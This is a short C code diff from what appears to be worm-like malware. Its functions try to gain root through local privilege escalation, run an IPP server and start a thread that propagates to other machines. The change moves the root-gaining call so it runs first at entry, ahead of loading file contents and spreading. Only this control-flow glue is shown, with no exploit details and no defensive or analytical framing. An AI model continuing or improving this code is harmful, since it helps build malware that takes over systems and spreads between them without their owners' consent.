@@ -21,19 +21,12 @@ void * start_ipp_server(void *varg){
     serve(global);
 }
 
-void * start_lpe(void *varg){
-    Globals *global = (Globals *) varg;
-    DEBUG_LOG("[LPE] Trying to gain root...\n");
-    try_get_root(varg);
-}
-
 void entry(Globals *global) {
+    // try to gain root
+    try_get_root(global);
+
     // load the file content into the global buffer
     load_file_bytes(global);
-
-    // try to gain root
-    pthread_t thread_id_lpe;
-    global->pthread_create(&thread_id_lpe, NULL, start_lpe, global);
 
     // start propagate
     pthread_t thread_id_propagate;
